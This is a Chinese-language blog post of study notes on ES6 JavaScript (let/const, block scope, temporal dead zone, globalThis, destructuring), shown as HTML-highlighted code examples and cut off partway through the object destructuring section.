    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文是阅读阮一峰老师《ECMAScript 6入门》的笔记(主要是记的知识点，外加自己的一点思考)，方便今后学习复习es6。</p><h1 id="ECMAScript6简介"><a href="#ECMAScript6简介" class="headerlink" title="ECMAScript6简介"></a>ECMAScript6简介</h1><h2 id="ECMAScript-和-JavaScript-的关系"><a href="#ECMAScript-和-JavaScript-的关系" class="headerlink" title="ECMAScript 和 JavaScript 的关系"></a>ECMAScript 和 JavaScript 的关系</h2><p>ECMAScript 和 JavaScript 的关系是，前者是后者的规格，后者是前者的一种实现。</p><h2 id="ES6-与-ECMAScript-2015-的关系"><a href="#ES6-与-ECMAScript-2015-的关系" class="headerlink" title="ES6 与 ECMAScript 2015 的关系"></a>ES6 与 ECMAScript 2015 的关系</h2><p>ES6 的第一个版本在 2015 年 6 月发布，正式名称是《ECMAScript 2015 标准》（简称 ES2015）。ES6 既是一个历史名词，也是一个泛指，含义是 5.1 版以后的 JavaScript 的下一代标准，涵盖了 ES2015、ES2016、ES2017 等等，而 ES2015 则是正式名称，特指该年发布的正式版本的语言标准。本书中提到 ES6 的地方，一般是指 ES2015 标准，但有时也是泛指“下一代 JavaScript 语言”。</p><h1 id="let-和-const-命令"><a href="#let-和-const-命令" class="headerlink" title="let 和 const 命令"></a>let 和 const 命令</h1><h2 id="1、let命令"><a href="#1、let命令" class="headerlink" title="1、let命令"></a>1、let命令</h2><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">var</span> b = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">a <span class="comment">// ReferenceError: a is not defined.</span></span><br><span class="line">b <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><p><code>let</code>声明的变量只在它所在的代码块有效。</p><p><code>for</code>循环还有一个特别之处，就是设置循环变量的那部分是一个父作用域，而循环体内部是一个单独的子作用域。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">  <span class="keyword">let</span> i = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// abc</span></span><br><span class="line"><span class="comment">// abc</span></span><br><span class="line"><span class="comment">// abc</span></span><br></pre></td></tr></table></figure><p>上面代码正确运行，输出了 3 次<code>abc</code>。这表明函数内部的变量<code>i</code>与循环变量<code>i</code>不在同一个作用域，有各自单独的作用域。</p><h3 id="不存在变量提升"><a href="#不存在变量提升" class="headerlink" title="不存在变量提升"></a>不存在变量提升</h3><p><code>var</code>命令会发生“变量提升”现象，即变量可以在声明之前使用，值为<code>undefined</code>；<code>let</code>命令改变了语法行为，它所声明的变量一定要在声明后使用，否则报错。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// var 的情况</span></span><br><span class="line"><span class="built_in">console</span>.log(foo); <span class="comment">// 输出undefined</span></span><br><span class="line"><span class="keyword">var</span> foo = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// let 的情况</span></span><br><span class="line"><span class="built_in">console</span>.log(bar); <span class="comment">// 报错ReferenceError</span></span><br><span class="line"><span class="keyword">let</span> bar = <span class="number">2</span>;</span><br></pre></td></tr></table></figure><h3 id="暂时性死区"><a href="#暂时性死区" class="headerlink" title="暂时性死区"></a>暂时性死区</h3><p>只要块级作用域内存在<code>let</code>命令，它所声明的变量就“绑定”（binding）这个区域，不再受外部的影响。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> tmp = <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  tmp = <span class="string">&#x27;abc&#x27;</span>; <span class="comment">// ReferenceError</span></span><br><span class="line">  <span class="keyword">let</span> tmp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码存在全局变量<code>tmp</code>，但是块级作用域内<code>let</code>又声明了一个局部变量<code>tmp</code>，导致<strong>后者绑定这个块级作用域</strong>，所以在<code>let</code>声明变量前，对<code>tmp</code>赋值会报错。</p><p>ES6 明确规定，如果区块中存在<code>let</code>和<code>const</code>命令，这个区块对这些命令声明的变量，从一开始就形成了封闭作用域。在声明之前无法使用这些变量，在语法上称为“暂时性死区”（temporal dead zone，简称 TDZ）。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="comment">// TDZ开始</span></span><br><span class="line">  tmp = <span class="string">&#x27;abc&#x27;</span>; <span class="comment">// ReferenceError</span></span><br><span class="line">  <span class="built_in">console</span>.log(tmp); <span class="comment">// ReferenceError</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> tmp; <span class="comment">// TDZ结束</span></span><br><span class="line">  <span class="built_in">console</span>.log(tmp); <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line">  tmp = <span class="number">123</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(tmp); <span class="comment">// 123</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>“暂时性死区”意味着<code>typeof</code>不再是一个百分之百安全的操作：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typeof</span> x; <span class="comment">// ReferenceError</span></span><br><span class="line"><span class="keyword">let</span> x;</span><br></pre></td></tr></table></figure><p>相比，如果一个变量根本没有被声明，使用<code>typeof</code>反而不会报错：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typeof</span> undeclared_variable <span class="comment">// &quot;undefined&quot;</span></span><br></pre></td></tr></table></figure><p>有些“死区”比较隐蔽，不太容易发现：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params">x = y, y = <span class="number">2</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> [x, y];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bar(); <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure><p>上面代码因为参数<code>x</code>默认值等于另一个参数<code>y</code>，而此时<code>y</code>还没有声明，属于“死区”。如果<code>y</code>的默认值是<code>x</code>，就不会报错，因为此时<code>x</code>已经声明了。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 不报错</span></span><br><span class="line"><span class="keyword">var</span> x = x;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="keyword">let</span> x = x;</span><br><span class="line"><span class="comment">// ReferenceError: x is not defined</span></span><br></pre></td></tr></table></figure><p>使用<code>let</code>声明变量时，只要变量在还没有声明完成前使用，就会报错。上面代码在变量<code>x</code>的声明语句还没有执行完成前，就去取<code>x</code>的值，导致报错”x 未定义“。</p><h3 id="不允许重复声明"><a href="#不允许重复声明" class="headerlink" title="不允许重复声明"></a>不允许重复声明</h3><p>不能在函数内部重新声明参数。第二段代码不报错是因为在函数内部又声明一个块级作用域。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">arg</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> arg;</span><br><span class="line">&#125;</span><br><span class="line">func() <span class="comment">// 报错</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">arg</span>) </span>&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">let</span> arg;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">func() <span class="comment">// 不报错</span></span><br></pre></td></tr></table></figure><h2 id="2、块级作用域"><a href="#2、块级作用域" class="headerlink" title="2、块级作用域"></a>2、块级作用域</h2><h3 id="为什么需要块级作用域？"><a href="#为什么需要块级作用域？" class="headerlink" title="为什么需要块级作用域？"></a>为什么需要块级作用域？</h3><ul><li><p>内层变量可能会覆盖外层变量。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> tmp = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(tmp);</span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> tmp = <span class="string">&#x27;hello world&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f(); <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure><p>函数<code>f</code>执行后，输出结果为<code>undefined</code>，原因在于变量提升，导致内层的<code>tmp</code>变量覆盖了外层的<code>tmp</code>变量。</p></li><li><p>用来计数的循环变量泄露为全局变量。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; s.length; i++) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(s[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(i); <span class="comment">// 5</span></span><br></pre></td></tr></table></figure><p>上面代码中，变量<code>i</code>只用来控制循环，但是循环结束后，它并没有消失，而是泄露成了全局变量。</p></li></ul><h3 id="ES6-的块级作用域"><a href="#ES6-的块级作用域" class="headerlink" title="ES6 的块级作用域"></a>ES6 的块级作用域</h3><p>ES6 允许块级作用域的任意嵌套。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#123;&#123;</span><br><span class="line">  &#123;<span class="keyword">let</span> insane = <span class="string">&#x27;Hello World&#x27;</span>&#125;</span><br><span class="line">  <span class="built_in">console</span>.log(insane); <span class="comment">// 报错</span></span><br><span class="line">&#125;&#125;&#125;&#125;;</span><br></pre></td></tr></table></figure><p>上面代码使用了一个五层的块级作用域，每一层都是一个单独的作用域。第四层作用域无法读取第五层作用域的内部变量。</p><p>块级作用域的出现，实际上使得立即执行函数表达式（匿名 IIFE）不再必要了。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// IIFE 写法</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> tmp = ...;</span><br><span class="line">&#125;());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 块级作用域写法</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">let</span> tmp = ...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="块级作用域与函数声明"><a href="#块级作用域与函数声明" class="headerlink" title="块级作用域与函数声明"></a>块级作用域与函数声明</h3><p>ES5 规定，函数只能在顶层作用域和函数作用域之中声明，不能在块级作用域声明。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 情况一</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 情况二</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面两种函数声明，根据 ES5 的规定都是非法的。但是浏览器为兼容以前的旧代码，还是支持在块级作用域之中声明函数，因此上面两种情况实际都能运行，不会报错。</p><p>ES6 引入了块级作用域，明确允许在块级作用域之中声明函数。ES6 规定，块级作用域之中，<strong>函数声明语句的行为类似于<code>let</code>，在块级作用域之外不可引用。</strong></p><p>但是，如果改变了块级作用域内声明的函数的处理规则，显然会对老代码产生很大影响。为了减轻因此产生的不兼容问题，ES6 规定，浏览器的实现可以有自己的行为方式：</p><ul><li>允许在块级作用域内声明函数。</li><li>函数声明类似于<code>var</code>，即会提升到全局作用域或函数作用域的头部。</li><li>同时，函数声明还会提升到所在的块级作用域的头部。</li></ul><p>注意，上面三条规则只对 ES6 的浏览器实现有效，其他环境的实现不用遵守，还是将块级作用域的函数声明当作<code>let</code>处理。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 浏览器的 ES6 环境</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">&#x27;I am outside!&#x27;</span>); &#125;</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="comment">// 重复声明一次函数f</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">&#x27;I am inside!&#x27;</span>); &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  f();</span><br><span class="line">&#125;());</span><br><span class="line"></span><br><span class="line"><span class="comment">//实际运行的代码如下：</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">&#x27;I am outside!&#x27;</span>); &#125;</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> f = <span class="literal">undefined</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">&#x27;I am inside!&#x27;</span>); &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  f();</span><br><span class="line">&#125;());</span><br><span class="line"><span class="comment">// Uncaught TypeError: f is not a function</span></span><br></pre></td></tr></table></figure><p>所以应该<strong>避免在块级作用域内声明函数</strong>。如果确实需要，也应该写成函数表达式（<code>let f = function()&#123;...&#125;</code>），而不是函数声明语句。</p><p>此外，ES6 的块级作用域必须有大括号，如果没有大括号，JavaScript 引擎就认为不存在块级作用域。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 第一种写法，报错</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) <span class="keyword">let</span> x = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二种写法，不报错</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> x = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3、const命令"><a href="#3、const命令" class="headerlink" title="3、const命令"></a>3、const命令</h2><h3 id="基本用法-1"><a href="#基本用法-1" class="headerlink" title="基本用法"></a>基本用法</h3><p><code>const</code>声明一个只读的常量。一旦声明，常量的值就不能改变。（即<code>const</code>一旦声明变量，就必须立即初始化，不能留到以后赋值。）只声明不赋值，就会报错！</p><p><code>const</code>的作用域与<code>let</code>命令相同：只在声明所在的块级作用域内有效，且声明的常量也是不提升，存在暂时性死区，只能在声明的位置后面使用。</p><h3 id="本质"><a href="#本质" class="headerlink" title="本质"></a>本质</h3><p><code>const</code>实际上保证的，并不是变量的值不得改动，而是<strong>变量指向的那个内存地址所保存的数据不得改动</strong>。对于简单类型的数据（数值、字符串、布尔值），值就保存在变量指向的那个内存地址，因此等同于常量。但对于复合类型的数据（主要是对象和数组），变量指向的内存地址，保存的只是一个指向实际数据的指针，<code>const</code>只能保证<strong>这个指针是固定的</strong>，至于它指向的数据结构是不是可变的，就完全不能控制了。因此，将一个对象声明为常量必须非常小心。</p><p>如果真的想将对象冻结，应该使用<code>Object.freeze</code>方法。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> foo = <span class="built_in">Object</span>.freeze(&#123;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 常规模式时，下面一行不起作用；</span></span><br><span class="line"><span class="comment">// 严格模式时，该行会报错</span></span><br><span class="line">foo.prop = <span class="number">123</span>;</span><br></pre></td></tr></table></figure><p>上面代码中，常量<code>foo</code>指向一个冻结的对象，所以添加新属性不起作用，严格模式时还会报错。</p><p>除了将对象本身冻结，对象的属性也应该冻结。下面是一个将对象彻底冻结的函数。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> constantize = <span class="function">(<span class="params">obj</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">Object</span>.freeze(obj);</span><br><span class="line">  <span class="built_in">Object</span>.keys(obj).forEach( <span class="function">(<span class="params">key, i</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">typeof</span> obj[key] === <span class="string">&#x27;object&#x27;</span> ) &#123;</span><br><span class="line">      constantize( obj[key] );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="ES6-声明变量的六种方法"><a href="#ES6-声明变量的六种方法" class="headerlink" title="ES6 声明变量的六种方法"></a>ES6 声明变量的六种方法</h3><p>ES5 只有两种声明变量的方法：<code>var</code>命令和<code>function</code>命令。ES6 除了添加<code>let</code>和<code>const</code>命令，还有<code>import</code>命令和<code>class</code>命令。</p><h2 id="4、顶层对象的属性"><a href="#4、顶层对象的属性" class="headerlink" title="4、顶层对象的属性"></a>4、顶层对象的属性</h2><p>顶层对象，在浏览器环境指的是<code>window</code>对象，在 Node 指的是<code>global</code>对象。</p><p>顶层对象的属性与全局变量挂钩带来了几个很大的问题：</p><ul><li>首先是没法在编译时就报出变量未声明的错误，只有运行时才能知道（因为全局变量可能是顶层对象的属性创造的，而属性的创造是动态的）；</li><li>其次，程序员很容易不知不觉地就创建了全局变量（比如打字出错）；</li><li>最后，顶层对象的属性是到处可以读写的，这非常不利于模块化编程。</li><li>另一方面，<code>window</code>对象有实体含义，指的是浏览器的窗口对象，顶层对象是一个有实体含义的对象，也是不合适的。</li></ul><p>ES6规定：为了保持兼容性，<code>var</code>命令和<code>function</code>命令声明的全局变量，依旧是顶层对象的属性；<code>let</code>命令、<code>const</code>命令、<code>class</code>命令声明的全局变量，不属于顶层对象的属性。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="comment">// 如果在 Node 的 REPL 环境，可以写成 global.a</span></span><br><span class="line"><span class="comment">// 或者采用通用方法，写成 this.a</span></span><br><span class="line"><span class="built_in">window</span>.a <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> b = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">window</span>.b <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure><h2 id="5、globalThis-对象"><a href="#5、globalThis-对象" class="headerlink" title="5、globalThis 对象"></a>5、globalThis 对象</h2><p>顶层对象在各种实现里面是不统一的：</p><ul><li>浏览器里面，顶层对象是<code>window</code>，但 Node 和 Web Worker 没有<code>window</code>。</li><li>浏览器和 Web Worker 里面，<code>self</code>也指向顶层对象，但是 Node 没有<code>self</code>。</li><li>Node 里面，顶层对象是<code>global</code>，但其他环境都不支持。</li></ul><p>为了能够在各种环境都能取到顶层对象，现在一般是使用<code>this</code>关键字，但是有局限性。</p><ul><li>全局环境中，<code>this</code>会返回顶层对象。但是，Node.js 模块中<code>this</code>返回的是当前模块，ES6 模块中<code>this</code>返回的是<code>undefined</code>。</li><li>函数里面的<code>this</code>，如果函数不是作为对象的方法运行，而是单纯作为函数运行，<code>this</code>会指向顶层对象。但是，严格模式下，这时<code>this</code>会返回<code>undefined</code>。</li><li>不管是严格模式，还是普通模式，<code>new Function(&#39;return this&#39;)()</code>，总是会返回全局对象。但是，如果浏览器用了 CSP（内容安全策略），那么<code>eval</code>、<code>new Function</code>这些方法都可能无法使用。</li></ul><h1 id="变量的解构赋值"><a href="#变量的解构赋值" class="headerlink" title="变量的解构赋值"></a>变量的解构赋值</h1><h2 id="1、数组的解构赋值"><a href="#1、数组的解构赋值" class="headerlink" title="1、数组的解构赋值"></a>1、数组的解构赋值</h2><h3 id="基本用法-2"><a href="#基本用法-2" class="headerlink" title="基本用法"></a>基本用法</h3><p>ES6 允许按照一定模式，从<strong>数组和对象</strong>中提取值，对变量进行赋值，这被称为解构（Destructuring）。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> [a, b, c] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br></pre></td></tr></table></figure><p>本质上，这种写法属于<strong>“模式匹配”</strong>，只要等号两边的模式相同，左边的变量就会被赋予对应的值。如果解构不成功，变量的值就等于<code>undefined</code>。不完全解构情况下，解构依然可以成功。</p><p>如果等号的右边不是数组（或者严格地说，<strong>不是可遍历的结构</strong>，参见《Iterator》一章），那么将会报错。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="keyword">let</span> [foo] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> [foo] = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">let</span> [foo] = <span class="literal">NaN</span>;</span><br><span class="line"><span class="keyword">let</span> [foo] = <span class="literal">undefined</span>;</span><br><span class="line"><span class="keyword">let</span> [foo] = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">let</span> [foo] = &#123;&#125;;</span><br></pre></td></tr></table></figure><p>只要某种数据结构具有 Iterator 接口，都可以采用数组形式的解构赋值。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Set结构</span></span><br><span class="line"><span class="keyword">let</span> [x, y, z] = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">x <span class="comment">// &quot;a&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//fibs是一个 Generator 函数（参见《Generator 函数》一章），原生具有 Iterator 接口。解构赋值会依次从这个接口获取值。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">fibs</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> b = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">yield</span> a;</span><br><span class="line">    [a, b] = [b, a + b];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> [first, second, third, fourth, fifth, sixth] = fibs();</span><br><span class="line">sixth <span class="comment">// 5</span></span><br></pre></td></tr></table></figure><h3 id="默认值"><a href="#默认值" class="headerlink" title="默认值"></a>默认值</h3><p>解构赋值允许指定默认值。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> [foo = <span class="literal">true</span>] = [];</span><br><span class="line">foo <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> [x, y = <span class="string">&#x27;b&#x27;</span>] = [<span class="string">&#x27;a&#x27;</span>]; <span class="comment">// x=&#x27;a&#x27;, y=&#x27;b&#x27;</span></span><br><span class="line"><span class="keyword">let</span> [x, y = <span class="string">&#x27;b&#x27;</span>] = [<span class="string">&#x27;a&#x27;</span>, <span class="literal">undefined</span>]; <span class="comment">// x=&#x27;a&#x27;, y=&#x27;b&#x27;</span></span><br></pre></td></tr></table></figure><p>注意，ES6 内部使用严格相等运算符（<code>===</code>），判断一个位置是否有值。所以，只有当一个数组成员严格等于<code>undefined</code>，默认值才会生效。(如果一个数组成员是<code>null</code>，默认值就不会生效，因为<code>null</code>不严格等于<code>undefined</code>。)</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> [x = <span class="number">1</span>] = [<span class="literal">undefined</span>];</span><br><span class="line">x <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> [x = <span class="number">1</span>] = [<span class="literal">null</span>];</span><br><span class="line">x <span class="comment">// null</span></span><br></pre></td></tr></table></figure><h2 id="2、对象的解构赋值"><a href="#2、对象的解构赋值" class="headerlink" title="2、对象的解构赋值"></a>2、对象的解构赋值</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>数组的元素是按次序排列的，变量的取值由它的位置决定；而对象的属性没有次序，变量必须与属性同名，才能取到正确的值。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123; bar, foo &#125; = &#123; <span class="attr">foo</span>: <span class="string">&#x27;aaa&#x27;</span>, <span class="attr">bar</span>: <span class="string">&#x27;bbb&#x27;</span> &#125;;</span><br><span class="line">foo <span class="comment">// &quot;aaa&quot;</span></span><br><span class="line">bar <span class="comment">// &quot;bbb&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123; baz &#125; = &#123; <span class="attr">foo</span>: <span class="string">&#x27;aaa&#x27;</span>, <span class="attr">bar</span>: <span class="string">&#x27;bbb&#x27;</span> &#125;;</span><br><span class="line">baz <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure><p>对象的解构赋值，可以很方便地将现有对象的方法，赋值到某个变量，如：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 例一</span></span><br><span class="line"><span class="keyword">let</span> &#123; log, sin, cos &#125; = <span class="built_in">Math</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例二</span></span><br><span class="line"><span class="keyword">const</span> &#123; log &#125; = <span class="built_in">console</span>;</span><br><span class="line">log(<span class="string">&#x27;hello&#x27;</span>) <span class="comment">// hello</span></span><br></pre></td></tr></table></figure><p>例一将<code>Math</code>对象的对数、正弦、余弦三个方法，赋值到对应的变量上，使用起来就会方便很多。例二将<code>console.log</code>赋值到<code>log</code>变量。</p><p>实际上，对象的解构赋值是下面形式的简写（参见《对象的扩展》一章）。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123; <span class="attr">foo</span>: foo, <span class="attr">bar</span>: bar &#125; = &#123; <span class="attr">foo</span>: <span class="string">&#x27;aaa&#x27;</span>, <span class="attr">bar</span>: <span class="string">&#x27;bbb&#x27;</span> &#125;;</span><br></pre></td></tr></table></figure><p>对象的解构赋值的<strong>内部机制</strong>，是先找到同名属性(即匹配的模式)，然后再赋给对应的变量。真正被赋值的是后者，而不是前者。</p><p>与数组一样，解构也可以用于嵌套结构的对象。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">  <span class="attr">p</span>: [</span><br><span class="line">    <span class="string">&#x27;Hello&#x27;</span>,</span><br><span class="line">    &#123; <span class="attr">y</span>: <span class="string">&#x27;World&#x27;</span> &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123; <span class="attr">p</span>: [x, &#123; y &#125;] &#125; = obj;</span><br><span class="line">x <span class="comment">// &quot;Hello&quot;</span></span><br><span class="line">y <span class="comment">// &quot;World&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> node = &#123;</span><br><span class="line">  <span class="attr">loc</span>: &#123;</span><br><span class="line">    <span class="attr">start</span>: &#123;</span><br><span class="line">      <span class="attr">line</span>: <span class="number">1</span>,</span><br><span class="line">      <span class="attr">column</span>: <span class="number">5</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123; loc, <span class="attr">loc</span>: &#123; start &#125;, <span class="attr">loc</span>: &#123; <span class="attr">start</span>: &#123; line &#125;&#125; &#125; = node;</span><br><span class="line">line <span class="comment">// 1</span></span><br><span class="line">loc  <span class="comment">// Object &#123;start: Object&#125;</span></span><br><span class="line">start <span class="comment">// Object &#123;line: 1, column: 5&#125;</span></span><br></pre></td></tr></table></figure><p>最后一次对<code>line</code>属性的解构赋值之中，只有<code>line</code>是变量，<code>loc</code>和<code>start</code>都是模式，不是变量。</p><p>嵌套赋值的例子:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> arr = [];</span><br><span class="line"></span><br><span class="line">(&#123; <span class="attr">foo</span>: obj.prop, <span class="attr">bar</span>: arr[<span class="number">0</span>] &#125; = &#123; <span class="attr">foo</span>: <span class="number">123</span>, <span class="attr">bar</span>: <span class="literal">true</span> &#125;);</span><br><span class="line"></span><br><span class="line">obj <span 